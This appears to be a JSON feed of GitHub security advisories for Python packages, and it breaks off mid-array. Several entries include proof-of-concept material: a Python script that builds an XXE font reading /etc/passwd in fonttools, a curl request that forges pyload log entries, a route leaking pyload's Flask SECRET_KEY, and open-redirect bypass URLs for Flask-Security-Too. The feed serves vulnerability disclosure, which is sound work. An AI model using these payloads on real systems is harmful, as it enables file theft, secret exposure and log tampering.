{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>Session Validation attacks in Apache Superset versions up to and including 2.0.1. Installations that have not altered the default configured SECRET_KEY according to installation instructions allow for an attacker to authenticate and access unauthorized resources. This does not affect Superset administrators who have changed the default value for SECRET_KEY config.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-27524\">https://nvd.nist.gov/vuln/detail/CVE-2023-27524</a></li>\n<li><a href=\"https://lists.apache.org/thread/n0ftx60sllf527j7g11kmt24wvof8xyk\">https://lists.apache.org/thread/n0ftx60sllf527j7g11kmt24wvof8xyk</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/04/24/2\">http://www.openwall.com/lists/oss-security/2023/04/24/2</a></li>\n<li><a href=\"https://github.com/apache/superset/commit/b180319bbf08e876ea84963220ebebbfd0699e03\">https://github.com/apache/superset/commit/b180319bbf08e876ea84963220ebebbfd0699e03</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/172522/Apache-Superset-2.0.0-Authentication-Bypass.html\">http://packetstormsecurity.com/files/172522/Apache-Superset-2.0.0-Authentication-Bypass.html</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/175094/Apache-Superset-2.0.0-Remote-Code-Execution.html\">http://packetstormsecurity.com/files/175094/Apache-Superset-2.0.0-Remote-Code-Execution.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5cx2-vq3h-x52c\">https://github.com/advisories/GHSA-5cx2-vq3h-x52c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5cx2-vq3h-x52c",
            "title": "[apache-superset] Apache superset missing check for default SECRET_KEY",
            "date_modified": "2024-01-09T16:41:20.000Z",
            "date_published": "2023-04-24T18:30:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5cx2-vq3h-x52c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>As of <code>fonttools&gt;=4.28.2</code> the subsetting module has a XML External Entity Injection (XXE) vulnerability which allows an attacker to resolve arbitrary entities when a candidate font (OT-SVG fonts), which contains a SVG table, is parsed. </p>\n<p>This allows attackers to include arbitrary files from the filesystem fontTools is running on or make web requests from the host system. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>The vulnerability can be reproduced following the bellow steps on a unix based system.</p>\n<ol>\n<li>Build a OT-SVG font which includes a external entity in the SVG table which resolves a local file. In our testing we utilised <code>/etc/passwd</code> for our POC file to include and modified an existing subset integration test to build the POC font - see bellow.</li>\n</ol>\n<pre><code class=\"language-python\">\nfrom string import ascii_letters\nfrom fontTools.fontBuilder import FontBuilder\nfrom fontTools.pens.ttGlyphPen import TTGlyphPen\nfrom fontTools.ttLib import newTable\n\n\nXXE_SVG = \"\"\"\\\n&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE svg [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;\n&lt;svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"&gt;\n  &lt;g id=\"glyph1\"&gt;\n    &lt;text font-size=\"10\" x=\"0\" y=\"10\"&gt;&amp;test;&lt;/text&gt;\n  &lt;/g&gt;\n&lt;/svg&gt;\n\"\"\"\n\ndef main():\n    # generate a random TTF font with an SVG table\n    glyph_order = [\".notdef\"] + list(ascii_letters)\n    pen = TTGlyphPen(glyphSet=None)\n    pen.moveTo((0, 0))\n    pen.lineTo((0, 500))\n    pen.lineTo((500, 500))\n    pen.lineTo((500, 0))\n    pen.closePath()\n    glyph = pen.glyph()\n    glyphs = {g: glyph for g in glyph_order}\n\n    fb = FontBuilder(unitsPerEm=1024, isTTF=True)\n    fb.setupGlyphOrder(glyph_order)\n    fb.setupCharacterMap({ord(c): c for c in ascii_letters})\n    fb.setupGlyf(glyphs)\n    fb.setupHorizontalMetrics({g: (500, 0) for g in glyph_order})\n    fb.setupHorizontalHeader()\n    fb.setupOS2()\n    fb.setupPost()\n    fb.setupNameTable({\"familyName\": \"TestSVG\", \"styleName\": \"Regular\"})\n\n    svg_table = newTable(\"SVG \")\n    svg_table.docList = [\n       (XXE_SVG, 1, 12)\n    ]\n    fb.font[\"SVG \"] = svg_table\n\n    fb.font.save('poc-payload.ttf')\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n<ol start=\"2\">\n<li>Subset the font with an affected version of fontTools - we tested on <code>fonttools==4.42.1</code> and <code>fonttools==4.28.2</code> - using the following flags (which just ensure the malicious glyph is mapped by the font and not discard in the subsetting process):</li>\n</ol>\n<pre><code class=\"language-shell\">pyftsubset poc-payload.ttf --output-file=\"poc-payload.subset.ttf\" --unicodes=\"*\" --ignore-missing-glyphs\n</code></pre>\n<ol start=\"3\">\n<li>Read the parsed SVG table in the subsetted font:</li>\n</ol>\n<pre><code class=\"language-shell\">ttx -t SVG poc-payload.subset.ttf &amp;&amp; cat poc-payload.subset.ttx\n</code></pre>\n<p>Observed the included contents of the <code>/etc/passwd</code> file. </p>\n<h3 id=\"impact\">Impact</h3>\n<p>Note the final severity is dependant on the environment fontTools is running in.</p>\n<ul>\n<li>The vulnerability has the most impact on consumers of fontTools who leverage the subsetting utility to subset untrusted OT-SVG fonts where the vulnerability may be exploited to read arbitrary files from the filesystem of the host fonttools is running on</li>\n</ul>\n<h3 id=\"possible-mitigations\">Possible Mitigations</h3>\n<p>There may be other ways to mitigate the issue, but some suggestions:</p>\n<ol>\n<li>Set the <code>resolve_entities=False</code> flag on parsing methods</li>\n<li>Consider further methods of disallowing doctype declarations</li>\n<li>Consider recursive regex matching</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/fonttools/fonttools/security/advisories/GHSA-6673-4983-2vx5\">https://github.com/fonttools/fonttools/security/advisories/GHSA-6673-4983-2vx5</a></li>\n<li><a href=\"https://github.com/fonttools/fonttools/commit/9f61271dc1ca82ed91f529b130fe5dc5c9bf1f4c\">https://github.com/fonttools/fonttools/commit/9f61271dc1ca82ed91f529b130fe5dc5c9bf1f4c</a></li>\n<li><a href=\"https://github.com/fonttools/fonttools/releases/tag/4.43.0\">https://github.com/fonttools/fonttools/releases/tag/4.43.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6673-4983-2vx5\">https://github.com/advisories/GHSA-6673-4983-2vx5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6673-4983-2vx5",
            "title": "[fonttools] fonttools XML External Entity Injection (XXE) Vulnerability",
            "date_modified": "2024-01-09T16:01:10.000Z",
            "date_published": "2024-01-09T16:01:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6673-4983-2vx5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An open redirect vulnerability in the python package Flask-Security-Too &lt;=5.3.2 allows attackers to redirect unsuspecting users to malicious sites via a crafted URL by abusing the ?next parameter on the /login and /register routes.</p>\n<p>Flask-Security-Too contains logic to validate that the URL specified within the next parameter is either relative or has the same network location as the requesting URL in an attempt to prevent open redirections. Previously known examples that bypassed the validation logic such as <code>https://example/login?next=\\\\\\\\\\\\github.com</code> were patched in version 4.1.0</p>\n<p>However, examples such as <code>https://example/login?next=/\\\\github.com</code> and <code>https://example/login?next=\\\\/github.com</code> were discovered due to how web browsers normalize slashes in URLs, which makes the package vulnerable through version &lt;=5.3.2</p>\n<p>Additionally, with Werkzeug &gt;=2.1.0 the autocorrect_location_header configuration was changed to False - which means that location headers in redirects are relative by default. Thus, this issue may impact applications that were previously not impacted, if they are using Werkzeug &gt;=2.1.0 as the WSGI layer.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49438\">https://nvd.nist.gov/vuln/detail/CVE-2023-49438</a></li>\n<li><a href=\"https://github.com/Flask-Middleware/flask-security\">https://github.com/Flask-Middleware/flask-security</a></li>\n<li><a href=\"https://github.com/brandon-t-elliott/CVE-2023-49438\">https://github.com/brandon-t-elliott/CVE-2023-49438</a></li>\n<li><a href=\"https://github.com/Flask-Middleware/flask-security/commit/8b5abc4d4db9926a3d76b34b8b03255effb5e712\">https://github.com/Flask-Middleware/flask-security/commit/8b5abc4d4db9926a3d76b34b8b03255effb5e712</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-672h-6x89-76m5\">https://github.com/advisories/GHSA-672h-6x89-76m5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-672h-6x89-76m5",
            "title": "[Flask-Security-Too] Open redirect vulnerability in Flask-Security-Too",
            "date_modified": "2024-01-08T21:47:13.000Z",
            "date_published": "2023-12-27T00:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-672h-6x89-76m5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Any unauthenticated user can browse to a specific URL to expose the Flask config, including the <code>SECRET_KEY</code> variable.</p>\n<h3 id=\"details\">Details</h3>\n<p>Any unauthenticated user can browse to a specific URL to expose the Flask config, including the <code>SECRET_KEY</code> variable.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Run <code>pyload</code> in the default configuration by running the following command</p>\n<pre><code>pyload\n</code></pre>\n<p>Now browse to <code>http://localhost:8000/render/info.html</code>. Notice how the Flask configuration gets displayed.\n<img alt=\"PoC\" src=\"https://user-images.githubusercontent.com/44903767/294522246-4cc19c49-b315-4926-8fd6-ec3c3fdb7c1f.png\"></p>\n<p>I was quite amused by this finding. I think it's a very interesting coming together of things that is so unlikely to happen. Below I will detail my process a bit more.</p>\n<p>I was looking through the code to see how the authorization mechanism is implemented when I spotted this route, which can be accessed by any unauthenticated actor</p>\n<ul>\n<li><a href=\"https://github.com/pyload/pyload/blob/57d81930edb59177c60830ad8ac36a91d0ec4c4e/src/pyload/webui/app/blueprints/app_blueprint.py#L33C1-L37C51\">https://github.com/pyload/pyload/blob/57d81930edb59177c60830ad8ac36a91d0ec4c4e/src/pyload/webui/app/blueprints/app_blueprint.py#L33C1-L37C51</a></li>\n</ul>\n<pre><code class=\"language-python\">@bp.route(\"/render/&lt;path:filename&gt;\", endpoint=\"render\")\ndef render(filename):\n    mimetype = mimetypes.guess_type(filename)[0] or \"text/html\"\n    data = render_template(filename)\n    return flask.Response(data, mimetype=mimetype)\n</code></pre>\n<p>This route allows me to load in any of the predefined templates. However, these templates will be lacking any form of context, and as such it doesn't seem too useful. That is until I loaded the <code>info.html</code> template and scrolled down, revealing the Flask config. This was purely accidental, and I did not understand why it happened, until I looked at the template</p>\n<ul>\n<li><a href=\"https://github.com/pyload/pyload/blob/57d81930edb59177c60830ad8ac36a91d0ec4c4e/src/pyload/webui/app/templates/info.html#L64C1-L67C10\">https://github.com/pyload/pyload/blob/57d81930edb59177c60830ad8ac36a91d0ec4c4e/src/pyload/webui/app/templates/info.html#L64C1-L67C10</a></li>\n</ul>\n<pre><code class=\"language-python\">    &lt;tr&gt;\n        &lt;td&gt;{{ _(\"Config folder:\") }}&lt;/td&gt;\n        &lt;td&gt;{{ config }}&lt;/td&gt;\n    &lt;/tr&gt;\n</code></pre>\n<p>In Flask, every template always gets the Flask config passed to it as the <code>config</code> variable. In the normal execution of this template, this value gets overwritten in the function below, but since we're calling it and bypassing this function altogether, it doesn't get overwritten. Would this variable not be named config and named <code>configuration</code> or <code>Config</code> instead, then this exploit wouldn't work. The likelihood of this occurring is so small, but it seems to have happened here.</p>\n<ul>\n<li><a href=\"https://github.com/pyload/pyload/blob/57d81930edb59177c60830ad8ac36a91d0ec4c4e/src/pyload/webui/app/blueprints/app_blueprint.py#L450C1-L461C51\">https://github.com/pyload/pyload/blob/57d81930edb59177c60830ad8ac36a91d0ec4c4e/src/pyload/webui/app/blueprints/app_blueprint.py#L450C1-L461C51</a></li>\n</ul>\n<pre><code class=\"language-python\">    context = {\n        \"python\": sys.version,\n        \"os\": \" \".join((os.name, sys.platform) + extra),\n        \"version\": api.get_server_version(),\n        \"folder\": PKGDIR,\n        \"config\": api.get_userdir(),\n        \"download\": conf[\"general\"][\"storage_folder\"][\"value\"],\n        \"freespace\": format.size(api.free_space()),\n        \"webif\": conf[\"webui\"][\"port\"][\"value\"],\n        \"language\": conf[\"general\"][\"language\"][\"value\"],\n    }\n    return render_template(\"info.html\", **context)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Depending on the how the Flask config data is used, it could have detrimental consequences for the security. It's crucial to keep the <code>SECRET_KEY</code> secret and never expose it in your code or configuration files.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pyload/pyload/security/advisories/GHSA-mqpq-2p68-46fv\">https://github.com/pyload/pyload/security/advisories/GHSA-mqpq-2p68-46fv</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21644\">https://nvd.nist.gov/vuln/detail/CVE-2024-21644</a></li>\n<li><a href=\"https://github.com/pyload/pyload/commit/bb22063a875ffeca357aaf6e2edcd09705688c40\">https://github.com/pyload/pyload/commit/bb22063a875ffeca357aaf6e2edcd09705688c40</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mqpq-2p68-46fv\">https://github.com/advisories/GHSA-mqpq-2p68-46fv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mqpq-2p68-46fv",
            "title": "[pyload-ng] pyload Unauthenticated Flask Configuration Leakage vulnerability",
            "date_modified": "2024-01-08T15:40:40.000Z",
            "date_published": "2024-01-08T15:40:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mqpq-2p68-46fv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A log injection vulnerability was identified in <code>pyload</code>. This vulnerability allows any unauthenticated actor to inject arbitrary messages into the logs gathered by <code>pyload</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p><code>pyload</code> will generate a log entry when attempting to sign in with faulty credentials. This entry will be in the form of <code>Login failed for user 'USERNAME'</code>. However, when supplied with a username containing a newline, this newline is not properly escaped. Newlines are also the delimiter between log entries. This allows the attacker to inject new log entries into the log file.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Run <code>pyload</code> in the default configuration by running the following command</p>\n<pre><code>pyload\n</code></pre>\n<p>We can now sign in as the pyload user and view the logs at <code>http://localhost:8000/logs</code>.\n<img alt=\"Viewing the logs\" src=\"https://user-images.githubusercontent.com/44903767/294433796-f2c96e39-8000-4649-99bb-9c50e786243d.png\"></p>\n<p>Any unauthenticated attacker can now make the following request to inject arbitrary logs.</p>\n<pre><code>curl 'http://localhost:8000/login?next=http://localhost:8000/' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw $'do=login&amp;username=wrong\\'%0a[2024-01-05 02:49:19]  HACKER               PinkDraconian  THIS ENTRY HAS BEEN INJECTED&amp;password=wrong&amp;submit=Login'\n</code></pre>\n<p>If we now were to look at the logs again, we see that the entry has successfully been injected.\n<img alt=\"PoC2\" src=\"https://user-images.githubusercontent.com/44903767/294434785-2fc6dce4-3e2c-4da0-8e80-a6bba882f756.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Forged or otherwise, corrupted log files can be used to cover an attacker’s tracks or even to implicate another party in the commission of a malicious act.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pyload/pyload/security/advisories/GHSA-ghmw-rwh8-6qmr\">https://github.com/pyload/pyload/security/advisories/GHSA-ghmw-rwh8-6qmr</a></li>\n<li><a href=\"https://github.com/pyload/pyload/commit/4159a1191ec4fe6d927e57a9c4bb8f54e16c381d\">https://github.com/pyload/pyload/commit/4159a1191ec4fe6d927e57a9c4bb8f54e16c381d</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21645\">https://nvd.nist.gov/vuln/detail/CVE-2024-21645</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ghmw-rwh8-6qmr\">https://github.com/advisories/GHSA-ghmw-rwh8-6qmr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ghmw-rwh8-6qmr",
            "title": "[pyload-ng] pyload Log Injection vulnerability",
            "date_modified": "2024-01-08T15:56:30.000Z",
            "date_published": "2024-01-08T15:29:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ghmw-rwh8-6qmr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Users hosting D-Tale publicly can be vulnerable to server-side request forgery (SSRF) allowing attackers to access files on the server.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version 3.9.0 where the \"Load From the Web\" input is turned off by default. You can find out more information on how to turn it back on <a href=\"https://github.com/man-group/dtale?tab=readme-ov-file#load-data--sample-datasets\">here</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only workaround for versions earlier than 3.9.0 is to only host D-Tale to trusted users.</p>\n<h3 id=\"references\">References</h3>\n<p>See \"Load Data &amp; Sample Datasets\" <a href=\"https://github.com/man-group/dtale?tab=readme-ov-file#load-data--sample-datasets\">documentation</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/man-group/dtale/security/advisories/GHSA-7hfx-h3j3-rwq4\">https://github.com/man-group/dtale/security/advisories/GHSA-7hfx-h3j3-rwq4</a></li>\n<li><a href=\"https://github.com/man-group/dtale/commit/954f6be1a06ff8629ead2c85c6e3f8e2196b3df2\">https://github.com/man-group/dtale/commit/954f6be1a06ff8629ead2c85c6e3f8e2196b3df2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21642\">https://nvd.nist.gov/vuln/detail/CVE-2024-21642</a></li>\n<li><a href=\"https://github.com/man-group/dtale?tab=readme-ov-file#load-data--sample-datasets\">https://github.com/man-group/dtale?tab=readme-ov-file#load-data--sample-datasets</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hfx-h3j3-rwq4\">https://github.com/advisories/GHSA-7hfx-h3j3-rwq4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hfx-h3j3-rwq4",
            "title": "[dtale] D-Tale server-side request forgery through Web uploads",
            "date_modified": "2024-01-08T14:58:50.000Z",
            "date_published": "2024-01-05T21:21:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hfx-h3j3-rwq4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>PyCryptodome and pycryptodomex before 3.19.1 allow side-channel leakage for OAEP decryption, exploitable for a Manger attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52323\">https://nvd.nist.gov/vuln/detail/CVE-2023-52323</a></li>\n<li><a href=\"https://github.com/Legrandin/pycryptodome/blob/master/Changelog.rst\">https://github.com/Legrandin/pycryptodome/blob/master/Changelog.rst</a></li>\n<li><a href=\"https://pypi.org/project/pycryptodomex/#history\">https://pypi.org/project/pycryptodomex/#history</a></li>\n<li><a href=\"https://github.com/Legrandin/pycryptodome/commit/0deea1bfe1489e8c80d2053bbb06a1aa0b181ebd\">https://github.com/Legrandin/pycryptodome/commit/0deea1bfe1489e8c80d2053bbb06a1aa0b181ebd</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j225-cvw7-qrx7\">https://github.com/advisories/GHSA-j225-cvw7-qrx7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j225-cvw7-qrx7",
            "title": "[pycryptodome] PyCryptodome and pycryptodomex side-channel leakage for OAEP decryption",
            "date_modified": "2024-01-05T17:28:19.000Z",
            "date_published": "2024-01-05T06:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j225-cvw7-qrx7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>PyCryptodome and pycryptodomex before 3.19.1 allow side-channel leakage for OAEP decryption, exploitable for a Manger attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52323\">https://nvd.nist.gov/vuln/detail/CVE-2023-52323</a></li>\n<li><a href=\"https://github.com/Legrandin/pycryptodome/blob/master/Changelog.rst\">https://github.com/Legrandin/pycryptodome/blob/master/Changelog.rst</a></li>\n<li><a href=\"https://pypi.org/project/pycryptodomex/#history\">https://pypi.org/project/pycryptodomex/#history</a></li>\n<li><a href=\"https://github.com/Legrandin/pycryptodome/commit/0deea1bfe1489e8c80d2053bbb06a1aa0b181ebd\">https://github.com/Legrandin/pycryptodome/commit/0deea1bfe1489e8c80d2053bbb06a1aa0b181ebd</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j225-cvw7-qrx7\">https://github.com/advisories/GHSA-j225-cvw7-qrx7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j225-cvw7-qrx7",
            "title": "[pycryptodomex] PyCryptodome and pycryptodomex side-channel leakage for OAEP decryption",
            "date_modified": "2024-01-05T17:28:19.000Z",
            "date_published": "2024-01-05T06:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j225-cvw7-qrx7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A cross-site scripting (XSS) vulnerability was discovered in the URL processing logic of the <code>image</code> and <code>link</code> plugins. The vulnerability allowed arbitrary JavaScript execution when updating an image or link using a specially crafted URL. This issue only impacted users while editing and the dangerous URLs were stripped in any content extracted from the editor. This impacts all users who are using TinyMCE 5.9.2 or lower.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been patched in TinyMCE 5.10.0 by improved sanitization logic when updating URLs in the relevant plugins.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To work around this vulnerability, either:</p>\n<ul>\n<li>Upgrade to TinyMCE 5.10.0 or higher</li>\n<li>Disable the <code>image</code> and <code>link</code> plugins</li>\n</ul>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>Tiny Technologies would like to thank Yakir6 for discovering this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://www.tiny.cloud/docs/release-notes/release-notes510/#securityfixes\">https://www.tiny.cloud/docs/release-notes/release-notes510/#securityfixes</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:infosec@tiny.cloud\">infosec@tiny.cloud</a></li>\n<li>Open an issue in the <a href=\"https://github.com/tinymce/tinymce/issues\">TinyMCE repo</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tinymce/tinymce/security/advisories/GHSA-r8hm-w5f7-wj39\">https://github.com/tinymce/tinymce/security/advisories/GHSA-r8hm-w5f7-wj39</a></li>\n<li><a href=\"https://github.com/jazzband/django-tinymce/issues/366\">https://github.com/jazzband/django-tinymce/issues/366</a></li>\n<li><a href=\"https://github.com/jazzband/django-tinymce/releases/tag/3.4.0\">https://github.com/jazzband/django-tinymce/releases/tag/3.4.0</a></li>\n<li><a href=\"https://pypi.org/project/django-tinymce/3.4.0/\">https://pypi.org/project/django-tinymce/3.4.0/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8hm-w5f7-wj39\">https://github.com/advisories/GHSA-r8hm-w5f7-wj39</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r8hm-w5f7-wj39",
            "title": "[django-tinymce] Cross-site scripting vulnerability in TinyMCE plugins",
            "date_modified": "2024-01-03T22:33:14.000Z",
            "date_published": "2021-11-02T15:42:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r8hm-w5f7-wj39"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>PaddlePaddle before 2.6.0 has a command injection in convert_shape_compare. This resulted in the ability to execute arbitrary commands on the operating system.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52314\">https://nvd.nist.gov/vuln/detail/CVE-2023-52314</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-023.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-023.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/5ed9478fdef96a06eeec9093f9e768c97b094af3\">https://github.com/PaddlePaddle/Paddle/commit/5ed9478fdef96a06eeec9093f9e768c97b094af3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cr5-2446-8pg3\">https://github.com/advisories/GHSA-3cr5-2446-8pg3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cr5-2446-8pg3",
            "title": "[PaddlePaddle] PaddlePaddle command injection in convert_shape_compare",
            "date_modified": "2024-01-03T22:03:03.000Z",
            "date_published": "2024-01-03T09:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cr5-2446-8pg3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Nullptr dereference in paddle.crop&nbsp;in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52312\">https://nvd.nist.gov/vuln/detail/CVE-2023-52312</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-021.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-021.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/488a0ddc322b24659b6b0067fea3030d2f013cf4\">https://github.com/PaddlePaddle/Paddle/commit/488a0ddc322b24659b6b0067fea3030d2f013cf4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qppw-c37g-xwcc\">https://github.com/advisories/GHSA-qppw-c37g-xwcc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qppw-c37g-xwcc",
            "title": "[PaddlePaddle] PaddlePaddle nullptr dereference in paddle.crop",
            "date_modified": "2024-01-03T22:02:42.000Z",
            "date_published": "2024-01-03T09:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qppw-c37g-xwcc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>PaddlePaddle before 2.6.0 has a command injection in _wget_download. This resulted in the ability to execute arbitrary commands on the operating system.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52311\">https://nvd.nist.gov/vuln/detail/CVE-2023-52311</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-020.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-020.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/c5f6862d118d7d69210f0e73bea1b055f5f21f2b\">https://github.com/PaddlePaddle/Paddle/commit/c5f6862d118d7d69210f0e73bea1b055f5f21f2b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf7p-79xq-8xwm\">https://github.com/advisories/GHSA-rf7p-79xq-8xwm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf7p-79xq-8xwm",
            "title": "[PaddlePaddle] PaddlePaddle command injection in _wget_download",
            "date_modified": "2024-01-03T21:57:56.000Z",
            "date_published": "2024-01-03T09:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf7p-79xq-8xwm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>PaddlePaddle before 2.6.0 has a command injection in get_online_pass_interval. This resulted in the ability to execute arbitrary commands on the operating system.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52310\">https://nvd.nist.gov/vuln/detail/CVE-2023-52310</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-019.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-019.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/49bec176053595975c1941cff9749c55f7203ea9\">https://github.com/PaddlePaddle/Paddle/commit/49bec176053595975c1941cff9749c55f7203ea9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j5h9-9r39-43q5\">https://github.com/advisories/GHSA-j5h9-9r39-43q5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j5h9-9r39-43q5",
            "title": "[PaddlePaddle] PaddlePaddle command injection in get_online_pass_interval",
            "date_modified": "2024-01-03T21:57:40.000Z",
            "date_published": "2024-01-03T09:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j5h9-9r39-43q5"
            },
            "tags": [
                "severity"
            ]
        },
        {
